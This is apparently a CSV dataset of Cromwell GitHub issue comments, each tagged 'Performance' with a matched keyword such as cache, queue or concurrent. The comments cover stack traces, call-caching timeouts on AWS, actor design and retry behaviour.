Performance,"(ToL, of course). I _still_ don't always know where to draw the line between creating a new `akka..Actor` and using a `scala..Future`. Something does ""smell"" funny though about the way we:; - Queue of things-to-do is on the `ec: ExecutionContext`; - A mailbox `message: AnyRef` is received off the `ec` by the dispatcher and passed to our `actor: Actor`.; - Instead of running a `runnable: Runnable` bit of code immediately, the `actor` chooses to throws the `runnable` onto the back of the `ec` queue and then say ""done processing `message`"". That said, [this blog](https://www.chrisstucchio.com/blog/2013/actors_vs_futures.html) seems to say that `Actor` and `Future` can work together, but maybe something is off about how we're composing them in our `BackendLifecycleActor` interfaces.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226573034:192,Queue,Queue,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226573034,2,"['Queue', 'queue']","['Queue', 'queue']"
Performance,(TraversableLike.scala:777) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.j,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:5223,concurren,concurrent,5223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['concurren'],['concurrent']
Performance,"(expr, context);; }. private static final NashornScriptEngineFactory ENGINE_FACTORY = new NashornScriptEngineFactory();. /**; * Add stricter Nashorn arguments to the default `-doe`.; *; * @see <a href=""https://docs.oracle.com/javase/8/docs/technotes/tools/windows/jjs.html"">JJS docs and options</a>; * @see <a href=""https://github.com/JetBrains/jdk8u_nashorn/blob/jdk8u76-b03/src/jdk/nashorn/internal/runtime/resources/Options.properties"">Nashorn supported options (github) </a>; * @see <a href=""http://hg.openjdk.java.net/jdk8/jdk8/nashorn/file/5dbdae28a6f3/src/jdk/nashorn/internal/runtime/resources/Options.properties"">Nashorn supported options</a>; * @see jdk.nashorn.api.scripting.NashornScriptEngineFactory#DEFAULT_OPTIONS; */; private static String[] nashornStrictArgs = {; ""-doe"", ""-strict"", ""--no-java"", ""--no-syntax-extensions"", ""--language=es5""; };. /**; * Don't allow any java classes.; */; private static ClassFilter noJavaClassFilter = anyClass -> false;. /**; * Copy/paste of the private jdk.nashorn.api.scripting.NashornScriptEngineFactory#getAppClassLoader().; * Of all the overloads of jdk.nashorn.api.scripting.NashornScriptEngineFactory#getScriptEngine, there is no jdk8; * one that receives just args and a class filter.; *; * @see jdk.nashorn.api.scripting.NashornScriptEngineFactory#getScriptEngine; * @see jdk.nashorn.api.scripting.NashornScriptEngineFactory#getAppClassLoader; */; private static ClassLoader getNashornClassLoader() {; // Revisit: script engine implementation needs the capability to; // find the class loader of the context in which the script engine; // is running so that classes will be found and loaded properly; final ClassLoader ccl = Thread.currentThread().getContextClassLoader();; return (ccl == null) ? NashornScriptEngineFactory.class.getClassLoader() : ccl;; }. private static final String LINE_SEPARATOR = System.getProperty(""line.separator"");. private static String expr(String... lines) {; return String.join(LINE_SEPARATOR, lines);; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573:12639,load,loader,12639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573,2,['load'],"['loaded', 'loader']"
Performance,"); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:399); 	at cromwell.backend.google.pipelines.v1alpha2.GenomicsFactory$$anon$1.runRequest(GenomicsFactory.scala:85); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline(PipelinesApiRunCreationClient.scala:53); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline$(PipelinesApiRunCreationClient.scala:48); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.runPipeline(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$createNewJob$19(PipelinesApiAsyncBackendJobExecutionActor.scala:572); 	at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:307); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; And instead of terminating immediately,",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629:2129,concurren,concurrent,2129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629,1,['concurren'],['concurrent']
Performance,"); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:707); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:704); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1258); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1254); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2020-08-25 10:40:46,27] [info] WorkflowMana",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929:2793,concurren,concurrent,2793,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929,1,['concurren'],['concurrent']
Performance,"* ~Created BT-346 to support requester pays GCR pulls.~ Looks like Denis [already asked about this](https://github.com/GoogleCloudPlatform/docker-credential-gcr/issues/36) and it doesn't appear to be on the roadmap for GCR.; * Cromwell does have support for Docker image caches on PAPI v2 beta, but this has not yet been rolled out to Terra (BT-116).; * Tagging in @wnojopra who has been working on regionality concerns (though not involving container repos AFAIK):; ** #6432 ; ** #6332; * I'm curious how requester pays image pulls would work with [Google Artifact Registry](https://cloud.google.com/artifact-registry/docs/transition/transition-from-gcr), the ""evolution"" of GCR which as I understand it is not as closely coupled to buckets.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-884451767:271,cache,caches,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-884451767,1,['cache'],['caches']
Performance,"**@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1597,cache,cache,1597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['cache'],['cache']
Performance,"**Status update**. tl;dr If one had to try to run the single sample pipeline on AWS, use a single i3.16xlarge spot instance, SUSE ECS optimized Linux, user data something like [this](https://github.com/broadinstitute/aws-backend-private/blob/master/scripts/suse-monster.sh), and otherwise follow the [lengthy script](https://docs.google.com/document/d/1qwY0QBo04WIAvsACbvtIshfxbs1OJRvNp93oclxCRk8/edit). But there’s still very little chance (like < 2%) that the workflow will succeed with full size BAMs. **SEGVs**. Amazon Linux ECS optimized (currently 64-bit amzn-ami-2016.09.g-amazon-ecs-optimized - ami-275ffe31) produces SEGVs with a consistency that makes it rare for workflows to survive to the MarkDuplicates step. No known workaround. Action: Don’t use Amazon Linux. **EFS**. EFS is currently several times slower for most tasks and orders of magnitude slower for MarkDuplicates. No known workaround. Action: Don’t use EFS, use a single-machine cluster. **NVMe drive disconnection**. SUSE Linux has a bug where the NVMe drives on i3 instance types (my preferred instance type with lots of fast instance storage) are randomly disconnected at boot time. Action: Live with it, harden the user data script to roll with whatever drives are available. Post in the forums. Nick reported this is a known problem and will be fixed upstream in SUSE eventually, but Amazon doesn’t control this AMI. **Random Docker CannotStartContainerErrors**. SUSE Linux consistently gets further in the workflow than Amazon Linux, but also consistently exhibits CannotStartContainerErrors deeper into the workflow. Action: Post in the forums. Although SUSE is more stable than Amazon Linux, there’s still not enough stability to run the workflow",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1542#issuecomment-292297531:134,optimiz,optimized,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1542#issuecomment-292297531,3,['optimiz'],['optimized']
Performance,"**Update: Non-additive retry counts**. If failures due to preemption can be clearly distinguished from failures due to other causes, I would prefer the failed_task_retries count to be independent of the preemptible count, rather than additive. For example, with failed_task_retries: 2 and preemptible: 2, I would expect the following behavior:; - try 1: preemptible machine, got preempted; - try 2: preemptible machine, other error (not preemption); - try 3: non-preemptible machine, error; - try 4: non-preemptible machine, error; - task fails. We have only retried 3 times here, because one of the non-preemption retries was ""used up"" when try 2 failed. (With additive behavior, we would have retried 4 times.). This behavior would allow users to independently set the retries due to preemption from those due to other causes, to more finely tune the desired behavior. However, if this can't be accommodated, this feature would still be very valuable with the additive behavior.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3161#issuecomment-358986427:844,tune,tune,844,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3161#issuecomment-358986427,1,['tune'],['tune']
Performance,"**Was the imports zip the same in each workflow?**; Yes, we were running the same workflow so the imports zip is the same. We get those import files by downloading them from github and adding them to a cache so that we don't have to download them for each workflow. **Were the workflows all the same?**; Yes, all of the workflows were the same . **Do you have any logs from the sender to check that a zip was indeed sent?**; No, we just have logs that a workflow was submitted to Cromwell 😞. **Were they submitted as a series of 999 separate submits or as a single batch submit POST?** ; They were submitted as a series of 999 individual requests in the ""On Hold"" status, and a separate process sent requests to Cromwell to started one of those on-hold workflows every 10 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-422854649:202,cache,cache,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-422854649,1,['cache'],['cache']
Performance,+; | TASK | ATTEMPT | ELAPSED | STATUS |; +----------------------------+---------+-----------------+-----------------------+; | batch_id_lines | 1 | 16.37s | Done |; | batch_sorted_tsv | 1 | 15.288s | Done |; | call_rate_lines | 1 | 5m34.525s | Done |; | computed_gender_lines | 1 | 5m34.523s | Done |; | csv2bam (Scatter) | - | 49.958s | 1/1 Done | 0 Failed |; | flatten_sample_id_lines | 1 | 5m29.56s | Done |; | get_max_nrecords (Scatter) | - | 5m32.076s | 1/1 Done | 0 Failed |; | green_idat_lines | 1 | 16.38s | Done |; | green_idat_tsv | 1 | 5m33.602s | Done |; | gtc | 1 | 10.602s | Done |; | gtc2vcf (Scatter) | - | 8m15.392s | 1/1 Done | 0 Failed |; | gtc_reheader | 1 | 4m16.907s | Done |; | gtc_tsv | 1 | 5m30.578s | Done |; | idat | 1 | 7.606s | Done |; | idat2gtc (Scatter) | - | 9m46.928s | 1/1 Done | 0 Failed |; | mocha_calls_tsv | 1 | 5m19.305941005s | Running |; | mocha_stats_tsv | 1 | 5m19.304938136s | Running |; | red_idat_lines | 1 | 16.386s | Done |; | red_idat_tsv | 1 | 5m33.603s | Done |; | ref_scatter | 1 | 17.728s | Done |; | sample_id_lines | 1 | 16.383s | Done |; | sample_id_split_tsv | 1 | 5m31.462s | Done |; | sample_sorted_tsv | 1 | 11.924s | Done |; | sample_tsv | 1 | 5m26.14s | Done |; | vcf_concat (Scatter) | - | 5m32.467s | 1/1 Done | 0 Failed |; | vcf_import (Scatter) | - | 8m16.609s | 1/1 Done | 0 Failed |; | vcf_merge (Scatter) | - | 2h6m53.926s | 23/23 Done | 0 Failed |; | vcf_mocha (Scatter) | - | 8m19.96s | 1/1 Done | 0 Failed |; | vcf_phase (Scatter) | - | 3h7m39.033s | 23/23 Done | 0 Failed |; | vcf_qc (Scatter) | - | 2h8m6.051s | 23/23 Done | 0 Failed |; | vcf_scatter (Scatter) | - | 5m25.444s | 1/1 Done | 0 Failed |; | vcf_split (Scatter) | - | 2h7m37.183s | 23/23 Done | 0 Failed |; | write_tsv | 1 | 5m10.124926865s | Running |; | xcl_vcf_concat | 1 | 5m28.883s | Done |; +----------------------------+---------+-----------------+-----------------------+; ```. > note: some tasks has duration of few seconds because I'm using call cache.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6677#issuecomment-1116554918:3498,cache,cache,3498,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6677#issuecomment-1116554918,1,['cache'],['cache']
Performance,", Jan 30, 2019 at 3:58 PM mcovarr <notifications@github.com> wrote:. > A handcrafted version of this query:; >; > select; > x2.`WORKFLOW_EXECUTION_UUID`,; > x2.`WORKFLOW_NAME`,; > x2.`WORKFLOW_STATUS`,; > x2.`START_TIMESTAMP`,; > x2.`END_TIMESTAMP`,; > x2.`SUBMISSION_TIMESTAMP`,; > x2.`WORKFLOW_METADATA_SUMMARY_ENTRY_ID`; > from; > WORKFLOW_METADATA_SUMMARY_ENTRY x2; > join; > (; > select; > WORKFLOW_EXECUTION_UUID; > from; > CUSTOM_LABEL_ENTRY; > where; > CUSTOM_LABEL_KEY = 'submissionIdKey'; > and CUSTOM_LABEL_VALUE = 'submissionIdValue'; > ) s; > on x2.WORKFLOW_EXECUTION_UUID = s.WORKFLOW_EXECUTION_UUID; > join; > (; > select; > WORKFLOW_EXECUTION_UUID; > from; > CUSTOM_LABEL_ENTRY; > where; > (; > CUSTOM_LABEL_KEY = 'caas-collection-name'; > and CUSTOM_LABEL_VALUE = 'me@gmail.com'; > ); > or (; > CUSTOM_LABEL_KEY = 'caas-collection-name'; > and CUSTOM_LABEL_VALUE = 'miguel-collection'; > ); > ) c; > on c.WORKFLOW_EXECUTION_UUID = x2.WORKFLOW_EXECUTION_UUID; >; > begets a much more performantEXPLAIN; >; > mysql> explain select x2.`WORKFLOW_EXECUTION_UUID`, x2.`WORKFLOW_NAME`, x2.`WORKFLOW_STATUS`, x2.`START_TIMESTAMP`, x2.`END_TIMESTAMP`, x2.`SUBMISSION_TIMESTAMP`, x2.`WORKFLOW_METADATA_SUMMARY_ENTRY_ID` from WORKFLOW_METADATA_SUMMARY_ENTRY x2 join (select WORKFLOW_EXECUTION_UUID from CUSTOM_LABEL_ENTRY where CUSTOM_LABEL_KEY = 'submissionIdKey' and CUSTOM_LABEL_VALUE = 'submissionIdValue') s on x2.WORKFLOW_EXECUTION_UUID = s.WORKFLOW_EXECUTION_UUID join (select WORKFLOW_EXECUTION_UUID from CUSTOM_LABEL_ENTRY where (CUSTOM_LABEL_KEY = 'caas-collection-name' and CUSTOM_LABEL_VALUE = 'me@gmail.com') or (CUSTOM_LABEL_KEY = 'caas-collection-name' and CUSTOM_LABEL_VALUE = 'miguel-collection')) c on c.WORKFLOW_EXECUTION_UUID = x2.WORKFLOW_EXECUTION_UUID;; > +----+-------------+--------------------+--------+---------------------------------------------+----------------------------------------+---------+---------------------------+------+---------------------------------",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459176050:1779,perform,performantEXPLAIN,1779,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459176050,1,['perform'],['performantEXPLAIN']
Performance,"- [x] Perform OAuth authentication (via clicky buttons in swagger, gcloud on CLI); - [x] Register user in Sam; - [x] Submit workflow to Cromwell; - [x] Get final results from Cromwell for that workflow",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2598#issuecomment-331165701:6,Perform,Perform,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2598#issuecomment-331165701,1,['Perform'],['Perform']
Performance,- throttling was on; - call cache hashing was done with file paths,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249863978:28,cache,cache,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249863978,1,['cache'],['cache']
Performance,"-21 15:09:44,61] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] WorkflowStoreActor stopped; [2018-11-21 15:09:44,61] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-11-21 15:09:44,62] [info] WorkflowLogCopyRouter stopped; [2018-11-21 15:09:44,62] [info] JobExecutionTokenDispenser stopped; [2018-11-21 15:09:44,62] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor All workflows finished; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor stopped; [2018-11-21 15:09:44,62] [info] Connection pools shut down; [2018-11-21 15:09:44,62] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] SubWorkflowStoreActor stopped; [2018-11-21 15:09:44,63] [info] JobStoreActor stopped; [2018-11-21 15:09:44,63] [info] DockerHashActor stopped; [2018-11-21 15:09:44,63] [info] IoProxy stopped; [2018-11-21 15:09:44,63] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] CallCacheWriteActor stopped; [2018-11-21 15:09:44,63] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] ServiceRegistryActor stopped; [2018-11-21 15:09:44,65] [info] Database closed; [2018-11-21 15:09:44,65] [info] Stream materializer shut down; [2018-11-21 15:09:44,66] [info] WDL HTTP import resolver closed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:6295,queue,queued,6295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,3,['queue'],['queued']
Performance,"-dd0b1399-ebb6-4d9b-89ea-7da193994220; 2018-06-07 12:16:52,353 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-07 12:16:52,362 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWork",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99083,concurren,concurrent,99083,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-d86697f6-ca39-417b-b575-fc955c808983/WorkflowExecutionActor-d86697f6-ca39-417b-b575-fc955c808983/d86697f6-ca39-417b-b575-fc955c808983-EngineJobExecutionActor-DeliciousFileSpam.FileSpam:364:1/d86697f6-ca39-417b-b575-fc955c808983-BackendJobExecutionActor-d86697f6:DeliciousFileSpam.FileSpam:364:1/JesAsyncBackendJobExecutionActor: exception during creation; at akka.actor.ActorInitializationException$.apply(Actor.scala:174); at akka.actor.ActorCell.create(ActorCell.scala:607); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: Connection reset; at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:63); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:94); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:137); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:30); at cromwell.backend.impl.jes.JesCallPaths.<init>(JesCallPaths.scala:16); at cromwell.backend.impl.jes.JesCallPaths$.apply(JesCallPaths.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719:1193,concurren,concurrent,1193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719,1,['concurren'],['concurrent']
